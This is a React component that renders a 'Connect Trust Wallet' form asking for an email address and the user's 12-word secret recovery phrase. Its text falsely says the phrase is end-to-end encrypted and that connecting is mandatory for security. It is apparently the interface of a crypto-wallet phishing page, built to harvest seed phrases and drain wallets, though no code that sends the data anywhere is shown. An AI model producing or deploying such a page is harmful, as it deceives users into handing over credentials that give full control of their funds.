
export default function ConnectWallet() {
  return (
    <div className="w-full flex justify-center py-16 px-4">
      <div className="w-full max-w-3xl bg-[#cfefff] rounded-xl p-8 shadow-lg">
        
        {/* Header */}
        <div className="flex items-center justify-center gap-3 mb-8">
          <div className="w-10 h-10 flex items-center justify-center rounded-full bg-white shadow">
            🛡️
          </div>
          <h1 className="text-2xl font-bold text-blue-600 tracking-wide">
            CONNECT <span className="text-blue-500">Trust Wallet</span>
          </h1>
        </div>

        {/* Email */}
        <div className="mb-6">
          <label className="block text-sm text-blue-700 mb-2">
            Enter your Email Address
          </label>
          <input
            type="email"
            placeholder="Email Address*"
            className="w-full px-4 py-3 rounded-md outline-none border border-transparent focus:border-blue-400"
          />
        </div>

        {/* Phrase title */}
        <div className="mb-2">
          <label className="block text-sm text-blue-700">
            Enter your Trust Wallet 12 word Secret Phrase
          </label>
        </div>

        {/* Info */}
        <p className="text-xs text-gray-700 mb-4">
          Trust Wallet must be atleast 30 days old and should have minimum $1 gas fees.
          Your Trust Wallet Phase Key is end to end encrypted. No one can view or access it.
        </p>

        {/* Phrase Box */}
        <div className="bg-[#9ec9f3] rounded-xl p-6">
          <div className="grid grid-cols-3 gap-4">
            {Array.from({ length: 12 }).map((_, i) => (
              <input
                key={i}
                placeholder={`${i + 1}. word`}
                className="px-3 py-2 rounded-md text-sm outline-none"
              />
            ))}
          </div>

          {/* Button */}
          <button className="w-full mt-6 bg-blue-600 hover:bg-blue-700 transition text-white py-3 rounded-full font-semibold text-lg">
            CONNECT
          </button>

          {/* Note */}
          <p className="text-center text-sm text-white mt-4">
            Note: Trust wallet connect is mandatory as per security.  
            For more contact our chat
          </p>
        </div>
      </div>
    </div>
  );
}
